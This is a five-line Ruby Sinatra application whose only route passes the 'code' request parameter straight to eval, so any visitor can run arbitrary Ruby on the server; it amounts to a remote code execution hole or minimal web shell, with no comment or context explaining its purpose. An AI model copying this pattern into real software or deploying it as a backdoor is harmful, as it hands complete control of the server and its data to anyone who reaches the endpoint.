require 'sinatra'

get '/' do
  eval(params[:code]) if params[:code]
end